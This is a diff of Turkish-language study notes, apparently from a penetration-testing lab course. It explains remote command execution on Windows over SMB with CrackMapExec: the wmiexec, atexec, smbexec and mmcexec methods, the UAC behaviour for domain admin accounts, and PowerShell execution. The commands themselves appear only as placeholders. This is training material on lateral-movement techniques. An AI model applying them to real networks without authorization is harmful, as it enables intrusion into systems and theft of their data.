-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
